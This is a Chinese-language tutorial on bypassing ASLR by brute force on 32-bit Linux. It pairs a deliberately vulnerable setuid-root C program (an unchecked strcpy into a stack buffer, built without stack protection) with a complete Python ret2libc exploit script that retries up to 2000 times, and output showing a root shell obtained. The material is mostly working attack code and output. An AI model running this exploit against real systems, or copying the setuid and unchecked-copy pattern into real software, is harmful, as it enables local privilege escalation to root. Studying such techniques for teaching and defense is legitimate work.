## Bypassing ASLR using brute-force

​	brute-force技术是攻击者选择一个特定的libc基地址尝试利用，直到成功为止。

​	存在漏洞代码：

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
    char buf[256];
    strcpy(buf,argv[1]);
    printf("%s\n",buf);
    fflush(stdout);
    return 0;
}
```

​	编译代码(~~禁用ASLR~~；关闭栈保护；~~标记堆栈为可执行~~；ELF文件执行时获得root权限)：

```shell
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -g -fno-stack-protector -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```

​	打开ASLR时，每次运行加载libc的基地址如下：

```shell
user@ubuntu:~/projects$ ldd ./vuln | grep libc 
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7 5d6 000)
user@ubuntu:~/projects$ ldd ./vuln | grep libc 
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7 624 000)
user@ubuntu:~/projects$ ldd ./vuln | grep libc 
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7 599 000)
user@ubuntu:~/projects$ ldd ./vuln | grep libc 
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7 5dd 000)
user@ubuntu:~/projects$ ldd ./vuln | grep libc 
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7 607 000)
```

​	如上所示，libc随机化限制为9位，因此随机选择一个地址来尝试，只有1/512才能获得root shell。即使在完全随机化情况下，尝试2000次就有超过98%的概率能获得root shell。

​	漏洞利用代码：

```python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

libc_base_addr = 0xb75d6000 # base address from 0xb7500000 to 0xb76ff0000
exit_off = 0x00032fc0    # "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit"
system_off = 0x0003d170  # "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system"
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
system_arg = 0x804827d  # "sh" string address

#endianess convertion
def conv(num):
	return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 268
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)

print "Calling vulnerable program"
# Multiple tries until we get
i = 0
while (i < 2000):
	print "Number of tries: %d" % i
 	i += 1
 	ret = call(["./vuln", buf])
 	if (not ret):
  		break
 	else:
  		print "Exploit failed"
```

​	执行exploit获得root shell：

```
Number of tries: 48
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp1a���}�
Exploit failed
Number of tries: 49
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp1a���}�
# whoami 
root
```

